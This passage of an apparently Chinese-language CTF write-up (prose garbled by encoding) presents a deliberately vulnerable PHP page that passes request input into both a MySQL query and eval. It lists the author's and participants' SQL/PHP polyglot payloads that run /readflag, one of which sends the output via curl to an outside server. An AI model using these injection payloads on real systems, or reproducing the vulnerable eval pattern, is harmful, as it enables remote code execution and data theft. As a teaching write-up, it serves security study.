    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat /flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸Šè¿°å‰åŠéƒ¨ç‚ºç’°å¢ƒçš„ä½ˆç½®ï¼ŒçœŸæ­£é¡Œç›®çš„é–‹å§‹å‰‡è¦è¦‹ä¸‹æ–¹ index.phpï¼Œå…¶ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; æ˜¯æˆ‘å€‘å¯ä»¥ä»»æ„æ§åˆ¶çš„åƒæ•¸ï¼Œé¡Œç›®é™¤äº† isset å¤–ä¸¦ç„¡å…¶ä»–ä»»ä½•æª¢æŸ¥ï¼Œéš¨å¾Œç¬¬ 8 è¡Œä¸­åƒæ•¸è¢«å¸¶å…¥ SQL èªå¥ä½œåŸ·è¡Œï¼Œå¦‚æœ SQL åŸ·è¡ŒæˆåŠŸä¸¦ä¸”æœ‰æŸ¥è©¢åˆ°è³‡æ–™ï¼Œå°±æœƒé€²å…¥ 15 è¡Œé–‹å§‹çš„è™•ç†ï¼Œä¾†è‡ª &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_REQUEST&lt;/code&gt; çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$column&lt;/code&gt; è®Šæ•¸å†æ¬¡è¢«ä½¿ç”¨ä¸¦å‚³å…¥ eval ä½œåŸ·è¡Œï¼Œé€™æ¨£çœ‹ä¸‹ä¾†é¡Œç›®çš„è§£é¡Œæ€è·¯å°±å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘å€‘éœ€è¦æ§‹é€ ä¸€å€‹å­—ä¸²ï¼ŒåŒæ™‚ç‚ºåˆæ³•çš„ SQL èªå¥èˆ‡ PHP èªå¥ï¼Œè®“ SQL åŸ·è¡Œæ™‚æœ‰å›å‚³å€¼ä¸” PHP åŸ·è¡Œæ™‚èƒ½å¤ åŸ·è¡Œä»»æ„ç³»çµ±æŒ‡ä»¤ï¼Œå°±èƒ½ getshell ä¸¦å‘¼å« /readflag å–å¾— flagï¼&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;index.php&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;No input&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;column&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;select &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; from mytable where id =&apos;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&apos;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;mysql&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;youtu.be/l11uaEjA-iI&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;sqltest&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_num_rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_fetch_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;output = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;row-&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$column&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Database error&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;å‡ºé¡Œè€…è§£æ³•&quot;&gt;å‡ºé¡Œè€…è§£æ³•&lt;/h2&gt;

&lt;p&gt;èº«ç‚ºå‡ºé¡Œè€…ï¼Œç•¶ç„¶å¿…é ˆå…ˆæ‹‹ç£šä¸€ä¸‹æ‰èƒ½å¤ å¼•ç‰ï½&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;exploit:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={passthru(&apos;/readflag&apos;)}&amp;amp;id=1

SQL: SELECT {passthru(&apos;/readflag&apos;)} FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;{passthru(&apos;/readflag&apos;)};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•åˆ©ç”¨äº† MySQL ä¸€å€‹ç›¸å®¹æ€§çš„ç‰¹æ€§ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{identifier expr}&lt;/code&gt; æ˜¯ ODBC Escape èªæ³•ï¼ŒMySQL ç›¸å®¹äº†é€™å€‹èªæ³•ï¼Œä½¿å¾—åœ¨èªå¥ä¸­å‡ºç¾æ™‚ä¸æœƒå°è‡´èªæ³•éŒ¯èª¤ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥æ§‹é€ å‡º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT {passthru &apos;/readflag&apos;} FROM mytable WHERE id = &apos;1&apos;&lt;/code&gt; å­—ä¸²ä»ç„¶æœƒæ˜¯åˆæ³•çš„ SQL èªå¥ï¼Œæ›´é€²ä¸€æ­¥åœ°å˜—è©¦å°‡ ODBC Escape ä¸­çš„ç©ºç™½ç§»é™¤æ”¹ä»¥æ‹¬è™ŸåŒ…å¤¾å­—ä¸²çš„è©±ï¼Œæœƒè®Šæˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT {passthru(&apos;/readflag&apos;)} FROM mytable WHERE id = &apos;1&apos;&lt;/code&gt;ï¼Œç”±æ–¼ MySQL æä¾›çš„èªæ³•å½ˆæ€§ï¼Œæ­¤æ®µèªå¥ä»ç„¶æœƒè¢«è¦–ç‚ºåˆæ³•ä¸¦ä¸”å¯æ­£å¸¸åŸ·è¡Œå¾—åˆ°ç›¸åŒçµæœã€‚&lt;/p&gt;

&lt;p&gt;æ¥è‘—å†çœ‹é€²åˆ° eval å‰æœƒæ§‹é€ å‡ºé€™æ¨£çš„ PHP èªå¥ï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$output = $row-&amp;gt;{passthru(&apos;/readflag&apos;)}&lt;/code&gt;ï¼Œç”±æ–¼ PHP åœ¨èªæ³•ä¸Šä¹Ÿæä¾›äº†æ¥µå¤§çš„å½ˆæ€§ï¼Œä½¿å¾—æˆ‘å€‘å¯ä»¥åˆ©ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$object-&amp;gt;{ expr }&lt;/code&gt; é€™æ¨£çš„èªæ³•å°‡ expr æ•˜è¿°å¥å‹•æ…‹åŸ·è¡Œå®Œçš„çµæœä½œç‚ºç‰©ä»¶å±¬æ€§åç¨±å»å­˜å–ç‰©ä»¶çš„å±¬æ€§ï¼Œå› æ­¤çµæœå°±æœƒå‘¼å« passthru å‡½å¼åŸ·è¡Œç³»çµ±æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;é€™é‚Šè£œå……ä¸€å€‹å†·çŸ¥è­˜ï¼Œç•¶æƒ³åˆ°ç³»çµ±æŒ‡ä»¤æ™‚ï¼Œå¤§å®¶ç›´è¦ºå¯èƒ½æœƒæƒ³åˆ°ä½¿ç”¨ system å‡½å¼ï¼Œä½†æ˜¯ MySQL åœ¨ 8.0.3 ä¸­å°‡ system åŠ å…¥é—œéµå­—ä¿ç•™å­—ä¹‹ä¸­ï¼Œè€Œé€™é¡Œç›®ç’°å¢ƒæ˜¯ä½¿ç”¨ MySQL 8.0 æ¶è¨­çš„ï¼Œæ‰€ä»¥å¦‚æœä½¿ç”¨ system çš„è©±åè€Œæœƒå¤±æ•—å”·ï¼&lt;/p&gt;

&lt;h2 id=&quot;ä¾†è‡ªæœƒçœ¾æœ‹å‹å€‘çš„è§£æ³•&quot;&gt;ä¾†è‡ªæœƒçœ¾æœ‹å‹å€‘çš„è§£æ³•&lt;/h2&gt;

&lt;p&gt;ç”±æ–¼æœ‹å‹å€‘è¸´èºæäº¤çš„è§£æ³•çœ¾å¤šï¼Œæ‰€ä»¥æˆ‘å€‘å°‡å„è§£æ³•ç°¡å–®åšäº†åˆ†çµ„ï¼Œå¦å¤–æé†’ä¸€ä¸‹ï¼Œä»¥ä¸‹é †åºåªæ˜¯æäº¤çš„å…ˆå¾Œæ™‚é–“å·®ï¼Œä¸¦ç„¡ä»»ä½•å„ªåŠ£ï¼Œèƒ½å–å¾— flag çš„è§£æ³•éƒ½æ˜¯å¥½è§£æ³•ï¼æ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘é€²è¡Œä»‹ç´¹å§ã€‚&lt;/p&gt;

&lt;h3 id=&quot;odbc-escape&quot;&gt;ODBC Escape&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;by Mico (https://www.facebook.com/MicoDer/):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column={exec(%27curl%20http://Mico_SRV/?`/readflag`%27)};%23&amp;amp;id=1

SQL: SELECT {exec(&apos;curl http://Mico_SRV/?`/readflag`&apos;)};# FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;{exec(&apos;curl http://Mico_SRV/?`/readflag`&apos;)};#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•èˆ‡å‡ºé¡Œè€…çš„ååˆ†é¡ä¼¼ï¼Œä½†æ²’æœ‰ä½¿ç”¨å¯ä»¥ç›´æ¥è¼¸å‡ºçµæœçš„ passthru è€Œæ˜¯æ”¹ç”¨ execï¼Œæ¥è‘—é€é curl æŠŠçµæœå›å‚³è‡³è‡ªå·±çš„ä¼ºæœå™¨ï¼Œæ“šæœ¬äººèªªæ³•æ˜¯å› ç‚ºã€Œè¦ºå¾—é§­å®¢å°±è©²å‚³äº›ä»€éº¼å›ä¾†è‡ªå·±Server XD ã€XDã€‚&lt;/p&gt;

&lt;h3 id=&quot;comment-everywhere&quot;&gt;Comment Everywhere&lt;/h3&gt;

&lt;p&gt;å¹¾ä¹æ‰€æœ‰ç¨‹å¼èªè¨€éƒ½æœ‰è¨»è§£ç¬¦è™Ÿå¯ä»¥è®“é–‹ç™¼äººå“¡åœ¨ç¨‹å¼ç¢¼ä¸­é–“åŠ ä¸Šæ–‡å­—èªªæ˜ï¼Œä»¥ä¾¿ä¸‹ä¸€å€‹é–‹ç™¼äººå“¡æ¥æ‰‹æ™‚å¯ä»¥å¿«é€Ÿç†è§£é€™æ®µç¨‹å¼ç¢¼çš„æ„ç¾©ã€‚ç•¶ç„¶ SQL èˆ‡ PHP ä¹Ÿæœ‰å„è‡ªçš„è¨»è§£ç¬¦è™Ÿï¼Œä½†å®ƒå€‘æ‰€æ”¯æ´çš„ç¬¦è™Ÿè¡¨ç¤ºç¨å¾®æœ‰äº›å·®ç•°ï¼Œè€Œé€™å°å·®ç•°å°±å¯ä»¥å¹«åŠ©æˆ‘å€‘é”æˆç›®çš„ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by LJP (https://ljp-tw.github.io/blog/)&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%0a-- /*%0a-- */ ; system(&apos;/readflag&apos;);%0a&amp;amp;id=1

SQL: SELECT id
     -- /*
     -- */ ; system(&apos;/readflag&apos;);
     FROM mytable WHERE id = &apos;1&apos;
PHP: $output = id
     -- /*
     -- */ ; system(&apos;/readflag&apos;);
     ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•çœ‹ä¼¼è¤‡é›œï¼Œæœ¬è³ªä¸Šå…¶å¯¦å¾ˆå–®ç´”ï¼Œå°±æ˜¯åˆ©ç”¨å…©å€‹èªè¨€æ”¯æ´ä¸åŒè¨»è§£ç¬¦è™Ÿçš„ç‰¹æ€§ã€‚å°æ–¼ SQL è€Œè¨€ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; æ˜¯è¨»è§£ç¬¦è™Ÿï¼Œæœƒç„¡è¦–å¾Œæ–¹æ‰€æœ‰åˆ°æ›è¡Œç‚ºæ­¢çš„æ–‡å­—ï¼Œæ‰€ä»¥æ¯ä¸€è¡Œä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; é–‹é ­çš„å­—ä¸²ï¼ŒSQL æ˜¯çœ‹ä¸è¦‹çš„ã€‚æ¥è‘—ä¾†çœ‹ PHPï¼Œå°æ–¼ PHP è€Œè¨€ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/* ä»»ä½•å­—ä¸² */&lt;/code&gt; é€™æ˜¯è¨»è§£çš„è¡¨ç¤ºæ–¹å¼ï¼Œé–‹é ­çµå°¾ç”± / èˆ‡ * çµ„æˆï¼Œä¸­é–“è¢«åŒ…å¤¾çš„å­—ä¸²æ˜¯çœ‹ä¸è¦‹çš„ï¼Œä¸¦ä¸”æ”¯æ´æ›è¡Œï¼Œè€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; åœ¨ PHP ä¹‹ä¸­å‰‡ä»£è¡¨éæ¸›é‹ç®—å­ï¼Œæ‰€ä»¥å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$output --&lt;/code&gt; å­—ä¸²å…¶å¯¦æ˜¯åœ¨å° $output é€²è¡Œæ¸› 1 çš„æ“ä½œã€‚ç¶œåˆä¸Šé¢ç‰¹æ€§ï¼Œå°æ–¼ä¸Šé¢çš„è§£æ³•ï¼Œå…¶å¯¦åªæœ‰ PHP çœ‹è¦‹çš„ç¬¬ä¸‰è¡Œ ` ; system(â€˜/readflagâ€™);` æœƒèªç‚ºæ˜¯éœ€è¦åŸ·è¡Œçš„ç¨‹å¼ç¢¼ï¼Œå…¶é¤˜éƒ¨åˆ†ä¸è«–æ˜¯ SQL é‚„æ˜¯ PHP éƒ½ä»¥ç‚ºæ˜¯è¨»è§£çš„å­—ä¸²è€Œç„¡è¦–ï¼Œå› æ­¤å¯ä»¥é †åˆ©åŸ·è¡Œå–å¾— flagã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by ankleboy (https://www.facebook.com/profile.php?id=100001963625238):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%20/*!%20from%20mytable%20*/%20--%20;%20system(%22/readflag%22)&amp;amp;id=1

SQL: SELECT name /*! from mytable */ -- ; system(&quot;/readflag&quot;) FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;name /*! from mytable */ -- ; system(&quot;/readflag&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ­¤è§£æ³•ä¹Ÿæ˜¯åŒæ¨£é‹ç”¨è¨»è§£ï¼Œä½†ä½¿ç”¨çš„è¨»è§£ç¬¦è™Ÿä¼¼ä¹ç¨å¾®ç‰¹æ®Šï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/* */&lt;/code&gt; é™¤äº† PHP ä¹‹å¤–ï¼ŒMySQL ä¹ŸåŒæ¨£æ”¯æ´æ­¤å…è¨±å¤šè¡Œçš„è¨»è§£ç¬¦è™Ÿï¼Œä½†å‡å¦‚å¤šä¸Šä¸€å€‹é©šå˜†è™Ÿ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt;ï¼Œäº‹æƒ…å°±åˆç¨å¾®ä¸åŒäº†ï¼Œé€™æ˜¯ MySQL ç‰¹æœ‰çš„è®Šç¨®è¨»è§£ç¬¦è™Ÿï¼Œåœ¨æ­¤ç¬¦è™Ÿä¸­çš„å­—ä¸²ï¼Œä»ç„¶æœƒè¢« MySQL ç•¶æˆ SQL çš„ä¸€éƒ¨åˆ†åŸ·è¡Œï¼Œä½†åœ¨å…¶ä»– DBMS ä¹‹ä¸­ï¼Œå› ç‚ºæ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*&lt;/code&gt; é–‹é ­å°±æœƒèªç‚ºå®ƒå°±æ˜¯å–®ç´”çš„è¨»è§£æ–‡å­—è€Œå¿½è¦–ï¼Œè®“é–‹ç™¼äººå“¡èƒ½æ’°å¯«å¯ portable çš„ç¨‹å¼ç¢¼ã€‚å› æ­¤å°±èƒ½è£½é€ å‡ºä¸€ä¸²è¨»è§£æ–‡å­—å¯è¢« MySQL çœ‹è¦‹ä½†ç„¡æ³•è¢« PHP çœ‹è¦‹ï¼Œå¼·åˆ¶åœ¨è¨»è§£æ–‡å­—è£¡è®“ SQL æ§‹é€ åˆæ³•èªå¥ï¼Œå†åˆ©ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; è¨»è§£é–‰åˆæ‰€æœ‰å†—è´… SQL èªå¥ï¼Œç·Šæ¥è‘— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; å¾Œå°±èƒ½æ’°å¯«ä»»æ„ PHP åŸ·è¡Œç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by FI:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`%23?&amp;gt;&amp;amp;id=1

SQL: SELECT id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åŒæ¨£æ˜¯åˆ©ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; è¨»è§£ç¬¦è™Ÿå¼·è¡Œæ§‹é€ åˆæ³•æŸ¥è©¢ï¼Œä¸éæœ‰è¶£çš„æ˜¯ï¼ŒMySQL æ”¯æ´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; å–®è¡Œçš„è¨»è§£ç¬¦è™Ÿï¼Œæ­¤è¨»è§£ç¬¦è™ŸåŒæ¨£ä¹Ÿè¢« PHP æ”¯æ´ï¼Œæ‰€ä»¥ä¸æœƒå°è‡´ PHP èªæ³•éŒ¯èª¤ï¼Œæœ€å¾Œé‚„å¤šäº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&amp;gt;&lt;/code&gt; å¼·è¡ŒçµæŸ PHP ç¨‹å¼å€å¡Šï¼Œå†·çŸ¥è­˜æ˜¯å¦‚æœç¨‹å¼ç¢¼æ˜¯ PHP ç¨‹å¼å€å¡Šå…§æœ€å¾Œä¸€è¡Œçš„è©±ï¼Œä¸åŠ  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; ä¸¦ä¸æœƒå°è‡´èªæ³•éŒ¯èª¤å”· :P&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by tree:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null--+.$output=exec(&apos;/readflag&apos;)&amp;amp;id=

SQL: SELECT null-- .$output=exec(&apos;/readflag&apos;) FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;null-- .$output=exec(&apos;/readflag&apos;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¹Ÿæ˜¯ç”¨äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; æŠŠ PHP ç¨‹å¼ç¢¼çš„éƒ¨åˆ†åœ¨ SQL è£¡é¢é®è”½èµ·ä¾†ï¼Œåˆ©ç”¨äº† null é—œéµå­—è®“ SQL æŸ¥è©¢æœ‰å›å‚³çµæœï¼Œä½†åœ¨ PHP ä¹‹ä¸­å»è®Šæˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$row-&amp;gt;null&lt;/code&gt; å° $row ç‰©ä»¶å­˜å–åç‚º null çš„å±¬æ€§ï¼Œä½¿å¾— PHP ä¹Ÿèƒ½åˆæ³•åŸ·è¡Œï¼Œæœ€å¾Œå°‡æŒ‡ä»¤åŸ·è¡Œçµæœè¦†è“‹ $output è®Šæ•¸ï¼Œè®“é¡Œç›®å¹«åŠ©æˆ‘å€‘è¼¸å‡ºçµæœã€‚&lt;/p&gt;

